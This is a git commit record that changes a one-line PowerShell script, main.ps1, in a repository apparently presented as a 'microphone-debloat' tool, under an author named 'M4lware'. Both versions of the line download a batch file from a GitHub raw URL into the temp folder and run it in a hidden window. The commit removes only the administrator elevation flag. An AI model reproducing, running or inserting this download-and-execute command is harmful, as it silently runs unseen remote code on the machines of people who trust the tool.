6e7648b2031d0cd0f3cdd915ad6bcb2fa5f9d4b1
M4lware <128651023+M4lware-01@users.noreply.github.com>
2023-08-06 18:53:11 +0600

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,1 +1,1 @@
-iwr -useb https://raw.githubusercontent.com/M4lware-01/microphone-debloat/main/script.bat -o $env:TEMP\x.bat;saps $env:TEMP\x.bat -WindowStyle Hidden -Verb RunAs
+iwr -useb https://raw.githubusercontent.com/M4lware-01/microphone-debloat/main/script.bat -o $env:TEMP\x.bat;saps $env:TEMP\x.bat -WindowStyle Hidden
